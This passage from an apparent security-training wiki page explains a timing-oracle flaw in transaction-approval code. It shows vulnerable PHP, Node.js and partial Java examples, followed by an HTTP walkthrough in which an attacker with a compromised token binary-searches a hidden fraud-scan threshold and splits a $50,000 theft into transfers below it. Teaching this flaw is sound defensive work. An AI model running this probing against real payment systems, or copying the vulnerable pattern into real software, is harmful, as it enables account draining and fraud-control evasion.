        // Fast-path approval (Takes ~15ms)
        executeTransfer(request);

        // Identical response body for both fast-path and slow-path approvals
        return ResponseEntity.ok(Map.of("status", "Approved"));
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class TransactionApprovalService extends Controller
{
    public function processTransfer(Request $request)
    {
        // [1]
        // [2]
        $requiresDeepScan = false;

        if ($request->input('amount') > 2500) $requiresDeepScan = true;
        if ($this->isNewDevice($request)) $requiresDeepScan = true;

        // [3]
        // [4]
        if ($requiresDeepScan) {
            // Synchronous HTTP call to a heavy ML microservice
            $fraudResponse = Http::timeout(5)->post('http://internal-ml-engine/scan', $request->all());
            
            if ($fraudResponse->json('is_fraud')) {
                return response()->json(['status' => 'Rejected'], 403);
            }
        }

        $this->executeTransfer($request);

        return response()->json(['status' => 'Approved']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class TransactionApprovalService {
    static async processTransfer(req, res) {
        // [1]
        // [2]
        let requiresDeepScan = false;

        if (req.body.amount > 2500) requiresDeepScan = true;
        if (req.body.international) requiresDeepScan = true;

        // [3]
        // [4]
        if (requiresDeepScan) {
            // Await blocks the event loop handling this specific request
            let fraudResult = await externalFraudApi.scan(req.body); // Takes ~1000ms
            if (fraudResult.isFraudulent) {
                return res.status(403).json({ status: "Rejected" });
            }
        }

        await executeTransfer(req.body);

        res.json({ status: "Approved" });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes high-value business transactions that mandate stringent anti-fraud and compliance oversight, \[2] To avoid massive vendor API costs and crippling system latency, developers optimize the validation pipeline by introducing an in-memory triage layer (fast-path rules), \[3] The architecture assumes that internal business logic thresholds (e.g., the exact dollar amount that triggers a manual review) are completely opaque to external users because the API returns an identical success message regardless of the execution path, \[4] The execution paradox. The system dynamically alters its operational workflow based on the payload's characteristics, invoking a synchronous, high-latency network call only when specific thresholds are breached. This architecture embeds a perfect Process Timing Oracle directly into the core business logic. An attacker systematically varies the input parameters, using the massive latency spike (from 15ms to 1200ms) as a binary indicator to definitively map the enterprise's proprietary risk models

```http
// 1. Attacker wants to drain a compromised account, but knows a massive $50,000 transfer will 
//    trigger the external ML fraud engine and be blocked.

// 2. Attacker probes the endpoint to map the hidden fast-path threshold.
POST /api/v1/transfers HTTP/1.1
Host: bank.enterprise.tld
Authorization: Bearer <compromised_token>
Content-Type: application/json

{"amount": 1000, "destination": "ATTACKER_ACCT"}
// Response: 200 OK. Time: 12ms. (Fast-path).

// 3. Attacker increases the amount.
POST /api/v1/transfers HTTP/1.1
Host: bank.enterprise.tld
Content-Type: application/json

{"amount": 5000, "destination": "ATTACKER_ACCT"}
// Response: 200 OK. Time: 1350ms. (Slow-path. The external ML model analyzed and approved it, but it took time).

// 4. Attacker utilizes binary search via an automated script.
// Amount: 3000 -> 1345ms.
// Amount: 2000 -> 14ms.
// Amount: 2500 -> 15ms.
// Amount: 2501 -> 1330ms.

// 5. Attacker successfully mapped the exact internal business rule: Threshold = $2500.
// 6. Attacker configures a script to execute 20 distinct transfers of $2500 each.
// 7. Every transaction evaluates in 15ms, perfectly bypassing the heavy ML anti-fraud engine, 
//    successfully draining $50,000 without triggering a single compliance alert.
```
{% endstep %}

{% step %}
To balance rigorous compliance requirements with acceptable user experience and infrastructure costs, platform engineers constructed a multi-tiered validation pipeline. They relied on the assumption that identical HTTP response structures effectively obfuscated the underlying control flow from external observers. However, they failed to recognize that delegating deep validation to a synchronous, high-latency external service created a severe temporal discontinuity. The attacker leveraged this temporal discontinuity as a Business Logic Oracle. By systematically altering the transaction parameters and measuring the response time, the attacker blindly reverse-engineered the enterprise's highly classified, proprietary risk thresholds. Equipped with this precise internal knowledge, the attacker automated payloads specifically sculpted to remain within the application's "fast-path," successfully executing massive aggregate fraud while completely circumventing the heavy external compliance engines designed to stop them
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
